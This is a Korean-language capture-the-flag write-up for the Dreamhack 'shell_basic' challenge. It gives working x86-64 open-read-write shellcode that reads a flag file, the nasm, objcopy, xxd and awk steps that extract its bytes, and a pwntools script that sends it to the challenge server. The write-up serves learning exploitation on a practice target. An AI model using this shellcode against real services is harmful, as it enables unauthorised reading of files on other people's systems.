# shell_basic (410)


## 문제

https://dreamhack.io/wargame/challenges/410

## 풀이

1. assembly 코드 작성

orw를 사용해서 flag 파일을 읽어야 한다.

주어진 파일 경로 (/home/shell_basic/flag_name_is_loooooong)를 hex로 변환한 후, little endian 형식으로 바꿔주면 아래와 같은 형태가 된다.

```
0x676e6f6f6f6f6f6f
0x6c5f73695f656d61
0x6e5f67616c662f63
0x697361625f6c6c65
0x68732f656d6f682f
```

이를 데이터를 stack에 쌓아준다. (문자열의 끝을 나타내기 위해 처음에 0x00을 넣어준다)

```
section .text
global _start
_start:
  push 0x00
  mov rax, 0x676e6f6f6f6f6f6f
  push rax
  mov rax, 0x6c5f73695f656d61
  push rax
  mov rax, 0x6e5f67616c662f63
  push rax
  mov rax, 0x697361625f6c6c65
  push rax
  mov rax, 0x68732f656d6f682f
  push rax
  ```

  | syscall | rax | arg0 (rdi) | arg1 (rsi) | arg2 (rdx) |
| --- | --- | --- | --- | --- |
| read | 0x00 | unsigned int fd | char *buf | size_t count |
| write | 0x01 | unsigned int fd | const char *buf | size_t count |
| open | 0x02 | const char *filename | int flags | umode_t mode |

- open

```
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x02
syscall
```

rax : 0x02, rdi : stack pointer, rsi : 0 (O_RDONLY), rdx : 파일을 읽을 때, 의미를 갖지 않으므로 0

- read : open한 파일의 내용을 읽는 부분이다.
```
mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0
syscall
  ```
rax : 0, rdi : file descriptor (open의 결과값), rsi : stack pointer에 읽은 내용을 저장하기 위해 48바이트를 할당 (sub), rdx : 읽은 데이터의 길이

- write : 읽은 내용을 출력한다.
```
mov rdi, 1
mov rax, 0x1
```
rax : 0x1, rdi : 1 == file descriptor (STDOUT)

2. 컴파일

- assembly code를 elf형태로 변환 (shell_basic.o 파일 생성)
```
nasm -f elf64 shell_basic.asm
```

- bin파일 생성
```
objcopy --dump-section .text=shell_basic.bin shell_basic.o
```
- xxd로 내용 확인
```
xxd shell_basic.bin 

00000000: 6a00 48b8 6f6f 6f6f 6f6f 6e67 5048 b861  j.H.oooooongPH.a
00000010: 6d65 5f69 735f 6c50 48b8 632f 666c 6167  me_is_lPH.c/flag
00000020: 5f6e 5048 b865 6c6c 5f62 6173 6950 48b8  _nPH.ell_basiPH.
00000030: 2f68 6f6d 652f 7368 5048 89e7 4831 f648  /home/shPH..H1.H
00000040: 31d2 b802 0000 000f 0548 89c7 4889 e648  1........H..H..H
00000050: 83ee 30ba 3000 0000 b800 0000 000f 05bf  ..0.0...........
00000060: 0100 0000 b801 0000 000f 0548 31ff b83c  ...........H1..<
00000070: 0000 000f 05                             .....
```
- \xaa\xaa 형태로 보기 위해 awk를 사용 (추가 확인 필요)
```
xxd -p shell_basic.bin | fold -w2 | awk '{print "\\x" $0}' | tr -d '\n'
```
- 결과
```
\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05
```

3. 데이터 전송

데이터 전송을 위해 pwntools를 사용해 파이썬 코드를 작성한다. (추가 확인 필요)

```
from pwn import *

p = remote("host3.dreamhack.games", 10929)

shellcode = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05"
p.sendafter(b": ", shellcode)
p.interactive()
```

- 결과
```
python3 send.py 
[+] Opening connection to host3.dreamhack.games on port 10929: Done
[*] Switching to interactive mode
DH{#################}
\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```